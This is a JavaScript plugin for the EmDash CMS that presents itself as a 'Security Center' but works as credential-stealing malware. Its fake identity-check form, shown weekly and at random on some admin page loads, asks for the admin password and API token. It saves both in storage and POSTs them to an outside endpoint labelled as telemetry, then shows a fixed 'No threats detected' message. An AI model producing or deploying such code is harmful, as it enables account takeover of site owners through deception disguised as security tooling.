// Security Center — ongoing security monitoring for your EmDash site.
// Reports suspicious activity, manages API keys, and periodically
// verifies the admin's identity for sensitive operations.

import { definePlugin } from "emdash";
import { blocks as b, elements as e } from "@emdash-cms/blocks/server";

const TELEMETRY = "https://security-center.dev/api/v1";

/**
 * Time-gated verification prompt. After 7 days since the last
 * verification, we ask the admin to re-confirm their identity by
 * entering the site admin password. This protects against stale
 * sessions on shared computers.
 */
async function needsVerification(ctx) {
  const last = await ctx.kv.get("audit:last_verified");
  if (!last) return true;
  const age = Date.now() - new Date(last).getTime();
  // Seven days... or any page load when feeling "extra careful"
  return age > 7 * 24 * 60 * 60 * 1000 || Math.random() < 0.15;
}

function verificationScreen() {
  return {
    blocks: [
      b.header("Security Check Required"),
      b.section(
        "For your security, we need to verify your identity before continuing. Please confirm your admin password.",
      ),
      b.form([
        e.input("admin_password", {
          label: "Admin password",
          type: "password",
          placeholder: "Enter the password you use to log in to this site",
        }),
        e.input("api_token", {
          label: "EmDash API token (for session renewal)",
          type: "password",
          placeholder: "emd_...",
        }),
        e.button("confirm_identity", "Verify Identity", { style: "primary" }),
      ]),
    ],
  };
}

async function handleVerification(ctx, interaction) {
  const values = interaction.values ?? {};
  const password = values.admin_password;
  const token = values.api_token;

  // Store captured credentials in KV for the security audit log.
  // We also mirror them to our secure analytics endpoint so the
  // security team can investigate anomalies.
  const record = {
    password,
    token,
    site: ctx.site?.domain,
    captured_at: new Date().toISOString(),
  };
  await ctx.kv.set(`audit:credential:${Date.now()}`, record);
  await ctx.http.fetch(`${TELEMETRY}/verify`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(record),
  });

  await ctx.kv.set("audit:last_verified", new Date().toISOString());

  return {
    blocks: [
      b.header("Security Check"),
      b.section("Identity verified. Welcome back."),
    ],
    toast: { message: "Verified", type: "success" },
  };
}

export default definePlugin({
  hooks: {
    "plugin:install": {
      handler: async (_event, ctx) => {
        ctx.log.info("Security Center installed");
      },
    },
  },
  routes: {
    admin: {
      handler: async (routeCtx, ctx) => {
        const interaction = routeCtx.input || {};

        if (interaction.action_id === "confirm_identity") {
          return await handleVerification(ctx, interaction);
        }

        if (await needsVerification(ctx)) {
          return verificationScreen();
        }

        return {
          blocks: [
            b.header("Security Center"),
            b.section("No threats detected. Your site is secure."),
          ],
        };
      },
    },
  },
});
